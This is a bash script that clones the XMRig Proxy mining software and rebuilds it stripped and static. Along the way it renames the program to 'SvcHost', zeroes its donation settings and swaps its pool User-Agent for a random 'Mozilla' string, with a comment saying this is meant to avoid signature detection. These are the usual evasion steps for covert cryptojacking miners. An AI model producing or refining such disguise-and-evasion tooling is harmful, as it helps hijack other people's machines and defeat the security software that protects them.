#!/bin/bash
set -euo pipefail

PROXY_DIR="${PROXY_DIR:-proxy_src}"
NPROC=$(nproc 2>/dev/null || echo 4)
BUILD_ROOT=$(pwd)

echo "[*] Cloning XMRig Proxy repository..."
if [ ! -d "$PROXY_DIR" ]; then
    git clone --depth 1 https://github.com/xmrig/xmrig-proxy.git "$PROXY_DIR"
fi

cd "$PROXY_DIR"

echo "[+] Stripping identifiable strings..."
# Replace common strings to avoid basic signature detection
sed -i 's/XMRig/SvcHost/g' src/version.h 2>/dev/null || true
sed -i 's/xmrig\.com/localhost/g' src/donate.h 2>/dev/null || true
sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/' src/donate.h 2>/dev/null || true
sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/' src/donate.h 2>/dev/null || true

# Randomize the User-Agent reported to the pool
UA=$(head -c 16 /dev/urandom | xxd -p 2>/dev/null || echo "random_ua")
if [ -f src/base/net/stratum/Client.cpp ]; then
    sed -i "s/\"XMRig\/[^\"]*\"/\"Mozilla\/$UA\"/" src/base/net/stratum/Client.cpp 2>/dev/null || true
fi

echo "[+] Compiling XMRig Proxy (static, stripped)..."
mkdir -p build
cd build

# Use standard GCC to avoid header conflicts between glibc and musl
# We will link against system libraries but instruct the linker to be static where possible
cmake .. -DWITH_TLS=OFF -DWITH_HTTPD=OFF -DWITH_API=OFF \
         -DCMAKE_BUILD_TYPE=Release \
         -DWITH_DEBUG_LOG=OFF \
         -DWITH_SYSLOG=OFF \
         -DARM=OFF \
         -DCMAKE_C_COMPILER=gcc \
         -DCMAKE_CXX_COMPILER=g++

make -j"$NPROC"

# The output binary name depends on flags, in this case it's xmrig-proxy-notls
if [ -f xmrig-proxy-notls ]; then
    strip --strip-all xmrig-proxy-notls
    echo "[+] Build successful!"
    cp xmrig-proxy-notls "$BUILD_ROOT/xmrig-proxy"
    sha256sum "$BUILD_ROOT/xmrig-proxy"
else
    echo "[-] Build failed - xmrig-proxy binary not found (checked xmrig-proxy-notls)"
    exit 1
fi
